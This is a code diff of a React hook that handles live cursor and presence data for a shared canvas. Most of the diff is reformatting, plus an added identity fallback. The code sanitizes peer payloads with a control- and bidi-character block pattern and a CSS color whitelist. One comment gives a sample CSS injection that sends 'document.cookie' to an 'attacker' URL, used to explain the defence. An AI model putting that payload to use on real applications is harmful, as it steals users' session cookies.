@@ -16,9 +16,19 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { getSupabaseClient, isRealtimeAvailable } from "@/lib/realtime/supabase-client";
 import type { SimplePresence } from "@/lib/realtime/use-presence";
+import { usePresenceIdentityOverride } from "@/lib/realtime/presence-identity";
 import { throttle, type Throttled } from "@/lib/utils/throttle";
 
-const AVATAR_COLORS = ["#00f0ff", "#a78bfa", "#34d399", "#f59e0b", "#f87171", "#60a5fa", "#fb923c", "#e879f9"];
+const AVATAR_COLORS = [
+  "#00f0ff",
+  "#a78bfa",
+  "#34d399",
+  "#f59e0b",
+  "#f87171",
+  "#60a5fa",
+  "#fb923c",
+  "#e879f9",
+];
 
 /** Bidi-override / isolate codepoints + C0 controls + LRM/RLM/ALM.
  * Block these in names/chat/reactions so a hostile peer can't:
@@ -32,7 +42,7 @@ const AVATAR_COLORS = ["#00f0ff", "#a78bfa", "#34d399", "#f59e0b", "#f87171", "#
  * stays pure ASCII. Raw bidi chars in a regex literal get mangled by
  * git autocrlf / editor save passes. */
 const RTL_OVERRIDE_RE = new RegExp(
-  "[\\u0000-\\u001F\\u007F\\u061C\\u200E\\u200F\\u202A-\\u202E\\u2066-\\u2069]",
+  "[\\u0000-\\u001F\\u007F\\u061C\\u200E\\u200F\\u202A-\\u202E\\u2066-\\u2069]"
 );
 
 /** Whitelist of safe CSS color forms: `#rgb`, `#rrggbb(aa)`,
@@ -43,7 +53,8 @@ const RTL_OVERRIDE_RE = new RegExp(
  * peer broadcasting `color: "red; background-image: url(https://attacker/?c=" + document.cookie + ")"`
  * would exfiltrate cookies to a third-party domain. Same regex shape
  * as use-presence.ts's COLOR_SAFE_RE. */
-const COLOR_SAFE_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;
+const COLOR_SAFE_RE =
+  /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;
 
 /**
  * Sanitize an inbound peer payload. Mirrors the validator in
@@ -66,11 +77,19 @@ function sanitizeCanvasPresence(v: unknown): SimplePresence | null {
   if (!v || typeof v !== "object") return null;
   const r = v as Record<string, unknown>;
   if (
-    typeof r.id !== "string" || r.id.length === 0 || r.id.length > ID_CAP ||
-    typeof r.name !== "string" || r.name.length === 0 || r.name.length > NAME_CAP ||
-    typeof r.color !== "string" || r.color.length === 0 || r.color.length > COLOR_CAP ||
-    RTL_OVERRIDE_RE.test(r.name) || RTL_OVERRIDE_RE.test(r.id)
-  ) return null;
+    typeof r.id !== "string" ||
+    r.id.length === 0 ||
+    r.id.length > ID_CAP ||
+    typeof r.name !== "string" ||
+    r.name.length === 0 ||
+    r.name.length > NAME_CAP ||
+    typeof r.color !== "string" ||
+    r.color.length === 0 ||
+    r.color.length > COLOR_CAP ||
+    RTL_OVERRIDE_RE.test(r.name) ||
+    RTL_OVERRIDE_RE.test(r.id)
+  )
+    return null;
   // Run the trimmed color through the CSS whitelist. Anything that
   // isn't a recognised CSS color form falls back to a safe default so
   // the peer still appears in the cursor list — better partial UX
@@ -79,18 +98,29 @@ function sanitizeCanvasPresence(v: unknown): SimplePresence | null {
   const out: SimplePresence = { id: r.id, name: r.name, color: safeColor };
   if (r.cursor && typeof r.cursor === "object") {
     const c = r.cursor as { x?: unknown; y?: unknown };
-    if (typeof c.x === "number" && Number.isFinite(c.x) &&
-        typeof c.y === "number" && Number.isFinite(c.y)) {
+    if (
+      typeof c.x === "number" &&
+      Number.isFinite(c.x) &&
+      typeof c.y === "number" &&
+      Number.isFinite(c.y)
+    ) {
       out.cursor = { x: c.x, y: c.y };
     }
   }
   if (r.viewport && typeof r.viewport === "object") {
     const vp = r.viewport as Record<string, unknown>;
-    if (typeof vp.x === "number" && Number.isFinite(vp.x) &&
-        typeof vp.y === "number" && Number.isFinite(vp.y) &&
-        typeof vp.zoom === "number" && Number.isFinite(vp.zoom) &&
-        typeof vp.w === "number" && Number.isFinite(vp.w) &&
-        typeof vp.h === "number" && Number.isFinite(vp.h)) {
+    if (
+      typeof vp.x === "number" &&
+      Number.isFinite(vp.x) &&
+      typeof vp.y === "number" &&
+      Number.isFinite(vp.y) &&
+      typeof vp.zoom === "number" &&
+      Number.isFinite(vp.zoom) &&
+      typeof vp.w === "number" &&
+      Number.isFinite(vp.w) &&
+      typeof vp.h === "number" &&
+      Number.isFinite(vp.h)
+    ) {
       out.viewport = { x: vp.x, y: vp.y, zoom: vp.zoom, w: vp.w, h: vp.h };
     }
   }
@@ -106,9 +136,12 @@ function sanitizeCanvasPresence(v: unknown): SimplePresence | null {
   if (r.chatBubble && typeof r.chatBubble === "object") {
     const cb = r.chatBubble as { text?: unknown; expiresAt?: unknown };
     if (
-      typeof cb.text === "string" && cb.text.length > 0 && cb.text.length <= 200 &&
+      typeof cb.text === "string" &&
+      cb.text.length > 0 &&
+      cb.text.length <= 200 &&
       !RTL_OVERRIDE_RE.test(cb.text) &&
-      typeof cb.expiresAt === "number" && Number.isFinite(cb.expiresAt)
+      typeof cb.expiresAt === "number" &&
+      Number.isFinite(cb.expiresAt)
     ) {
       const cap = Date.now() + 30_000;
       out.chatBubble = { text: cb.text, expiresAt: Math.min(cb.expiresAt, cap) };
@@ -118,10 +151,16 @@ function sanitizeCanvasPresence(v: unknown): SimplePresence | null {
     const re = r.reaction as { emoji?: unknown; x?: unknown; y?: unknown; expiresAt?: unknown };
     const emojiStr = typeof re.emoji === "string" ? re.emoji : null;
     if (
-      emojiStr && emojiStr.length > 0 && emojiStr.length <= 8 && !RTL_OVERRIDE_RE.test(emojiStr) &&
-      typeof re.x === "number" && Number.isFinite(re.x) &&
-      typeof re.y === "number" && Number.isFinite(re.y) &&
-      typeof re.expiresAt === "number" && Number.isFinite(re.expiresAt)
+      emojiStr &&
+      emojiStr.length > 0 &&
+      emojiStr.length <= 8 &&
+      !RTL_OVERRIDE_RE.test(emojiStr) &&
+      typeof re.x === "number" &&
+      Number.isFinite(re.x) &&
+      typeof re.y === "number" &&
+      Number.isFinite(re.y) &&
+      typeof re.expiresAt === "number" &&
+      Number.isFinite(re.expiresAt)
     ) {
       const cap = Date.now() + 10_000;
       out.reaction = { emoji: emojiStr, x: re.x, y: re.y, expiresAt: Math.min(re.expiresAt, cap) };
@@ -149,8 +188,16 @@ export interface CanvasPresenceHook {
 
 const CURSOR_THROTTLE_MS = 60;
 
-export function useCanvasPresence(channelName: string | null, hint?: Partial<SimplePresence>): CanvasPresenceHook {
+export function useCanvasPresence(
+  channelName: string | null,
+  hint?: Partial<SimplePresence>
+): CanvasPresenceHook {
   const [members, setMembers] = useState<SimplePresence[]>([]);
+  // Identity precedence: explicit `hint` > tree-scoped PresenceIdentity
+  // context > "Anonymous". Symmetric with useRoom so the canvas presence
+  // layer and the room layer agree on who this peer is when the caller
+  // doesn't pass an explicit name (owner-side AppShell mount path).
+  const contextIdentity = usePresenceIdentityOverride();
 
   // Self identity — stable across renders. crypto.randomUUID falls back to
   // a timestamp-anchored Math.random shim if the global isn't present
@@ -159,10 +206,13 @@ export function useCanvasPresence(channelName: string | null, hint?: Partial<Sim
   // encoding terminated early), which collide across same-second joiners.
   const selfRef = useRef<{ id: string; name: string; color: string } | null>(null);
   if (!selfRef.current) {
-    const id = hint?.id ?? (typeof crypto !== "undefined" && crypto.randomUUID
-      ? crypto.randomUUID()
-      : `p_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 9).padEnd(7, "0")}`);
-    const name = hint?.name ?? "Anonymous";
+    const id =
+      hint?.id ??
+      contextIdentity?.id ??
+      (typeof crypto !== "undefined" && crypto.randomUUID
+        ? crypto.randomUUID()
+        : `p_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 9).padEnd(7, "0")}`);
+    const name = hint?.name ?? contextIdentity?.name ?? "Anonymous";
     const color = hint?.color ?? colorFor(name);
     selfRef.current = { id, name, color };
   }
@@ -225,7 +275,11 @@ export function useCanvasPresence(channelName: string | null, hint?: Partial<Sim
       void Promise.resolve(channel.untrack())
         .then(() => channel.unsubscribe())
         .catch(() => {});
-      try { void getSupabaseClient()?.removeChannel(channel); } catch { /* client torn down */ }
+      try {
+        void getSupabaseClient()?.removeChannel(channel);
+      } catch {
+        /* client torn down */
+      }
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [channelName]);
